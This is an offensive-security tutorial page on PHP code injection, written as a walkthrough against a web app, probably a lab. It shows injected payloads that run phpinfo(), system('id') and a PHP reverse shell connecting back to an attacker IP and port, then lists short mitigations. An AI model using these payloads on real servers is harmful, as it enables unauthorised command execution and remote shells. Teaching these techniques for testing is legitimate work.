<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Code Injection" /><meta property="og:locale" content="en" /><meta name="description" content="Code Injection" /><meta property="og:description" content="Code Injection" /><link rel="canonical" href="https://cyberkhalid.github.io/posts/codei/" /><meta property="og:url" content="https://cyberkhalid.github.io/posts/codei/" /><meta property="og:site_name" content="cyberkhalid" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-01T05:49:33+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Code Injection" /><meta name="twitter:site" content="@_cyberkhalid" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-01T05:49:33+08:00","datePublished":"2022-01-01T05:49:33+08:00","description":"Code Injection","headline":"Code Injection","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyberkhalid.github.io/posts/codei/"},"url":"https://cyberkhalid.github.io/posts/codei/"}</script><title>Code Injection | cyberkhalid</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="cyberkhalid"><meta name="application-name" content="cyberkhalid"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/cyberkhalid/cyberkhalid/main/cyberl.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">cyberkhalid</a></div><div class="site-subtitle font-italic">Offensive Security || Red Team || Pentester || • 0xCyb3rkh4l1d •</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/cyberkhalid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_cyberkhalid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['root','cyberkhalid.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Code Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Code Injection</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/0xcyb3rkh4l1d">cyberkhalid</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1640987373" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="456 words"> <em>2 min</em> read</span></div></div></div><div class="post-content"><h1 id="code-injection">Code Injection</h1><p>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. Code Injection differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, they are only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell.</p><h1 id="detection">Detection</h1><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei2.png" alt="codei" data-proofer-ignore></p><p>The webapp seems to take in user supplied input and reflect it on the page. if we replace test with any text we want, we will have our text displayed on the page. Let’s replace it with <code class="language-plaintext highlighter-rouge">exploit</code>.</p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei3.png" alt="codei" data-proofer-ignore></p><p>We got <code class="language-plaintext highlighter-rouge">exploit</code> displayed on the page.</p><p>Let’s conduct a fuzzing on the parameter to see if we can break something and get an error, or if we can determine some anomality from the response. There are lot of characters that can be used such as <code class="language-plaintext highlighter-rouge">; , || ' @ / &gt; &lt; $...</code>. We will start with <code class="language-plaintext highlighter-rouge">;</code>.</p><p>We are going to supply <code class="language-plaintext highlighter-rouge">exploit;</code> and see if we can get something interesting</p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei4.png" alt="codei" data-proofer-ignore></p><p>Well, it reflected the text without <code class="language-plaintext highlighter-rouge">;</code>, it supposed to display <code class="language-plaintext highlighter-rouge">exploit;</code> not <code class="language-plaintext highlighter-rouge">exploit</code> on the page, so there must be something behind.</p><p>Let’s change the input to be like this <code class="language-plaintext highlighter-rouge">;exploit</code> and see again</p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei5.png" alt="codei" data-proofer-ignore></p><p>As you can see nothing was displayed, which was supposed to display <code class="language-plaintext highlighter-rouge">;exploit</code> on the page. This means our input broke something in the backend, this webapp might be vulnerable to either <code class="language-plaintext highlighter-rouge">code injection</code> or <code class="language-plaintext highlighter-rouge">command injection</code> because <code class="language-plaintext highlighter-rouge">;</code> character is mostly used in shell or in code that is needed to evaluate string as a code.</p><p>Let’s test for code injection. Since this is php, we will make use of <code class="language-plaintext highlighter-rouge">phpinfo()</code> function to test for code injection, which if successfull will display plenty information about php and the server itself. We will supply <code class="language-plaintext highlighter-rouge">exploit;phpinfo();</code></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei6.png" alt="codei" data-proofer-ignore></p><p>We got it. This means the webapp is vulnerable to code injection.</p><h1 id="exploitation">Exploitation</h1><h2 id="echoying-text"><span class="mr-2">Echo’ying text</span><a href="#echoying-text" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s see if we can execute php code by supplying this <code class="language-plaintext highlighter-rouge">exploit;echo 'yes';</code></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei7.png" alt="codei" data-proofer-ignore></p><p>It’s been executed, you can see <code class="language-plaintext highlighter-rouge">yes</code> has been displayed on the page.</p><h2 id="system-command"><span class="mr-2">System Command</span><a href="#system-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>php has <code class="language-plaintext highlighter-rouge">system</code> function that will allow us to execute shell command in the backend. Let’s supply <code class="language-plaintext highlighter-rouge">exploit;system('id');</code></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei8.png" alt="codei" data-proofer-ignore></p><p>Well, <code class="language-plaintext highlighter-rouge">id</code> was executed.</p><h2 id="reverse-shell"><span class="mr-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To get a reverse shell, we will intercept the request in burp suite, setup our listerner, supply our payload and then forward it to the server.</p><p>our payload here</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$sock</span><span class="o">=</span>fsockopen<span class="o">(</span><span class="s2">"[ip]"</span>,[port]<span class="o">)</span><span class="p">;</span><span class="nv">$proc</span><span class="o">=</span>proc_open<span class="o">(</span><span class="s2">"/bin/bash"</span>, array<span class="o">(</span><span class="nv">0</span><span class="o">=&gt;</span><span class="nv">$sock</span>, <span class="nv">1</span><span class="o">=&gt;</span><span class="nv">$sock</span>, <span class="nv">2</span><span class="o">=&gt;</span><span class="nv">$sock</span><span class="o">)</span>,<span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>

</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei9.png" alt="codei" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/codei10.png" alt="codei" data-proofer-ignore></p><p>We got reverse shell.</p><h1 id="mitigations">Mitigations</h1><ul><li>Avoid using unsafe functions in source code.<li>Utilize Whitelisting for input validation.<li>Escaping All User Supplied Input.</ul><h1 id="references">References</h1><ul><li><a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/webapp-and-api-pentesting/'>WebApp And Api Pentesting</a>, <a href='/categories/code-injection/'>Code Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Code Injection - cyberkhalid&amp;url=https://cyberkhalid.github.io/posts/codei/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Code Injection - cyberkhalid&amp;u=https://cyberkhalid.github.io/posts/codei/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://cyberkhalid.github.io/posts/codei/&amp;text=Code Injection - cyberkhalid" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/pcron/">Cronjob</a><li><a href="/posts/autorun/">Registry Autoruns</a><li><a href="/posts/pwautorun/">Registry Autoruns</a><li><a href="/posts/pwstartup/">Startups</a><li><a href="/posts/winprivsrvunq/">Insecure Service-> Unquoted Service Path</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/xpathi/"><div class="card-body"> <em class="timeago small" data-ts="1640987373" > 2022-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>XPATH Injection</h3><div class="text-muted small"><p> XPATH Injection XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data. By sending intentionally malformed information into the web s...</p></div></div></a></div><div class="card"> <a href="/posts/xssd/"><div class="card-body"> <em class="timeago small" data-ts="1640987373" > 2022-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DOM-based XSS</h3><div class="text-muted small"><p> DOM-based XSS Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker use...</p></div></div></a></div><div class="card"> <a href="/posts/xssr/"><div class="card-body"> <em class="timeago small" data-ts="1640987373" > 2022-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reflected XSS</h3><div class="text-muted small"><p> Reflected XSS Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker use...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/clickjack/" class="btn btn-outline-primary" prompt="Older"><p>Clickjacking</p></a> <a href="/posts/cors/" class="btn btn-outline-primary" prompt="Newer"><p>Cross-Origin Resource Sharing</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/0xcyb3rkh4l1d">cyberkhalid</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
